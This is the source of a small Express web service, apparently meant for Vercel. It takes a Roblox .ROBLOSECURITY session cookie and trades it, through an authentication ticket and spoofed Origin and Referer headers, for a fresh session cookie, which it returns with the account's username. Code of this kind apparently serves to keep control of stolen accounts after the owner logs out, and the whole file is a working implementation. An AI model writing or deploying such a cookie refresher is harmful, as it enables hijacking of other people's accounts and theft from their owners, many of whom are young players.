import express from 'express';
import axios from 'axios';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.json());

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// API endpoint
app.post('/api/refresh', async (req, res) => {
    try {
        const oldCookie = req.body.cookie;
        
        if (!oldCookie) {
            return res.status(400).json({ error: "No cookie provided" });
        }

        console.log('Using authentication ticket method...');

        // Step 1: Get CSRF token
        const csrfToken = await getCSRFToken(oldCookie);
        if (!csrfToken) {
            return res.status(400).json({ error: "Failed to get CSRF token" });
        }

        // Step 2: Get authentication ticket
        const authTicket = await getAuthenticationTicket(oldCookie, csrfToken);
        if (!authTicket) {
            return res.status(400).json({ error: "Failed to get authentication ticket" });
        }

        // Step 3: Redeem ticket for new cookie
        const newCookie = await redeemAuthTicket(authTicket, csrfToken);
        if (!newCookie) {
            return res.status(400).json({ error: "Failed to redeem authentication ticket" });
        }

        // Get username for display
        const username = await getUsername(oldCookie);

        res.json({
            success: true,
            newCookie: newCookie,
            length: newCookie.length,
            username: username,
            message: 'Cookie refreshed using authentication ticket system'
        });

    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Serve frontend for all other routes
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

async function getCSRFToken(cookie) {
    try {
        const response = await axios.post('https://auth.roblox.com/v2/login', 
            {},
            {
                headers: {
                    'Cookie': `.ROBLOSECURITY=${cookie}`,
                    'Content-Type': 'application/json'
                },
                validateStatus: () => true
            }
        );
        return response.headers['x-csrf-token'];
    } catch (error) {
        console.error('CSRF token error:', error.message);
        return null;
    }
}

async function getAuthenticationTicket(cookie, csrfToken) {
    try {
        const response = await axios.post('https://auth.roblox.com/v1/authentication-ticket',
            {},
            {
                headers: {
                    'Cookie': `.ROBLOSECURITY=${cookie}`,
                    'X-CSRF-TOKEN': csrfToken,
                    'Content-Type': 'application/json',
                    'Origin': 'https://www.roblox.com',
                    'Referer': 'https://www.roblox.com/games/920587237/Adopt-Me',
                    'RBXAuthenticationNegotiation': '1'
                },
                validateStatus: () => true
            }
        );
        return response.headers['rbx-authentication-ticket'];
    } catch (error) {
        console.error('Auth ticket error:', error.message);
        return null;
    }
}

async function redeemAuthTicket(authTicket, csrfToken) {
    try {
        const response = await axios.post('https://auth.roblox.com/v1/authentication-ticket/redeem',
            { authenticationTicket: authTicket },
            {
                headers: {
                    'Content-Type': 'application/json',
                    'Origin': 'https://www.roblox.com',
                    'Referer': 'https://www.roblox.com/games/920587237/Adopt-Me',
                    'X-CSRF-TOKEN': csrfToken,
                    'RBXAuthenticationNegotiation': '1'
                },
                validateStatus: () => true
            }
        );

        const setCookieHeaders = response.headers['set-cookie'];
        if (setCookieHeaders) {
            for (const header of setCookieHeaders) {
                if (header.includes('.ROBLOSECURITY=')) {
                    const match = header.match(/\.ROBLOSECURITY=([^;]+)/);
                    if (match && match[1]) return match[1];
                }
            }
        }
        return null;
    } catch (error) {
        console.error('Redeem error:', error.message);
        return null;
    }
}

async function getUsername(cookie) {
    try {
        const response = await axios.get('https://users.roblox.com/v1/users/authenticated', {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        });
        return response.data.name;
    } catch (error) {
        return 'Unknown';
    }
}

// Export for Vercel
export default app;